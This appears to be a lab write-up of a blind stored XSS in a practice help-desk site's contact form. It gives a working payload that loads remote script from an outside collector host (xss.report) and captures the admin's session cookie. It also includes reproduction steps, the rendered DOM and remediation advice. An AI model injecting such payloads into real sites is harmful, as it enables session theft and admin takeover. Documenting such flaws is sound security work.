Lab name : Blind XSS - Deskflow Help Center
# Title
Blind Cross-Site Scripting (XSS) via Contact Support Form Leading to Admin Session Compromise

# Vulnerability Type
Blind Cross-Site Scripting (XSS) / Stored XSS

# Summary
The application is vulnerable to Blind Cross-Site Scripting (XSS) through the public "Contact support" form. The application fails to properly sanitize or encode user-supplied input in the `Your name`, `Subject`, and `Description` fields before storing it in the database. When a support agent or administrator logs into the backend workspace and views the submitted ticket, the malicious JavaScript payload executes automatically in the administrator's browser context. This allows an attacker to execute arbitrary code within the privileged administrator session.

# Vulnerable Endpoint
- `https://deskflow.pwnedbox.site/request.php` (Injection Point)
- `https://deskflow.pwnedbox.site/admin/view.php?id=1` (Execution Point)

# Vulnerable Parameter
- `Your Name`
- `Subject
- `Description`

# Steps to Reproduce
1. Navigate to the contact support form: `https://deskflow.pwnedbox.site/request.php`
2. In the **"Your name"**, **"Subject"**, and **"Description"** fields, insert the following payload:  
    `"><img/src/onerror=import('//xss.report/c/cyberbro')>`
3. Fill in the remaining required fields (Email address, Category, Priority) with valid data and click **"Send request"**.
4. Wait for the support agent/administrator to log in and view the submitted ticket in the admin workspace.
5. Observe the out-of-band interaction on `xss.report`. The tool successfully captures the execution, recording the admin's `PHPSESSID` cookie, the URI (`/admin/view.php?id=1`), and the Referrer (`/admin/index.php`), confirming the payload executed in the admin's browser.

# Payload Used 
`"><img/src/onerror=import('//xss.report/c/cyberbro')>`

# Proof of Concept
<img width="1920" height="1040" alt="1" src="https://github.com/user-attachments/assets/4ca92d2f-5c5f-4171-a23a-ec149fc7caac" />
<img width="1920" height="1038" alt="2" src="https://github.com/user-attachments/assets/309aeea7-7c31-4f88-ae12-09ece1d9e471" />
<img width="1920" height="1040" alt="3" src="https://github.com/user-attachments/assets/dc86d283-7564-4a07-a31c-cefb38543359" />
<img width="1920" height="1040" alt="4" src="https://github.com/user-attachments/assets/9f2de517-f0fe-4327-ad67-4068ed247bb3" />
<img width="1920" height="1040" alt="5" src="https://github.com/user-attachments/assets/622f45d5-58cf-437f-9e51-47cba331d387" />

# Extracted DOM
```js
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'"&gt;&lt;img/src/onerror=import('//xss.report/c/cyberbro')&gt;</title><link rel="stylesheet" href="../assets/style.css"></head><body class="staff"><aside class="staffside"><a class="logo" href="../index.php"><span>desk</span>flow</a><a class="sideactive" href="index.php">Inbox</a><a href="articles.php">Knowledge base</a><a href="../index.php">View portal</a><a href="logout.php">Sign out</a></aside><main class="staffmain detailstaff"><a class="back" href="index.php">← Inbox</a><div class="split"><section class="conversation"><small>DF-3DA7D7E9</small><h1>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></h1><div class="person"><div class="initial">'</div><div><b>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></b><span>hello@gmail.com · Account</span></div></div><div class="msg"><p>'"&gt;<img src="" onerror="import('//xss.report/c/cyberbro')"></p><small>Oct 22, 2026 04:40</small></div></section><aside class="ticketpanel"><small>UPDATE TICKET</small><form method="post" action="update.php"><input type="hidden" name="csrf" value="d9ad8ac1c2da34852a5223aa6a2f44255fb7f501055df8d2"><input type="hidden" name="id" value="1"><label>Status<select name="status"><option selected="">open</option><option>pending</option><option>solved</option><option>closed</option></select></label><label>Priority<select name="priority"><option selected="">low</option><option>normal</option><option>high</option><option>urgent</option></select></label><label>Reply to customer<textarea name="reply" rows="8" placeholder="Write a helpful response..."></textarea></label><button>Save &amp; update</button></form></aside></div></main><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;534dbc1854e3437aa1164d09110b7f47&quot;,&quot;r&quot;:1,&quot;spa&quot;:2}" crossorigin="anonymous"></script>
</body></html>
```

# Impact
Because this is a Blind XSS, the payload executes in the browser of an internal user (specifically, the site administrator) when they view the infected inquiries. This is a critical vulnerability. An attacker can perform the following actions:

- **Session Hijacking & Admin Account Takeover:** Steal the administrator's session cookie (`PHPSESSID`), allowing the attacker to completely bypass authentication and take over the admin account.
- **Privileged Actions:** The script can make authenticated requests on behalf of the administrator to perform sensitive actions, such as altering site content, viewing sensitive customer data, or creating new admin users.
- **Exfiltration of Sensitive Data:** The payload can read the contents of the admin dashboard or internal pages and send them to an attacker-controlled server.

# Recommendation for fix
1. **Output Encoding:** Apply context-aware HTML entity encoding to **all** user-supplied data before rendering it in **any** interface, including backend administrative panels (e.g., convert `<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`). The backend must be treated with the same security rigor as the public-facing frontend.
2. **Input Sanitization:** Use a reputable HTML sanitization library (such as DOMPurify) to strip dangerous tags and attributes from user input before storing it in the database. If rich text is not required, strip all HTML tags entirely.
3. **Content Security Policy (CSP):** Deploy a strict CSP header on the administrative backend to prevent the execution of inline scripts and unauthorized external scripts as a defense-in-depth measure.
4. **Secure Cookies:** Ensure all session cookies (like `PHPSESSID`) use the `HttpOnly` and `Secure` flags to prevent JavaScript from accessing them, mitigating the risk of session hijacking even if an XSS occurs.
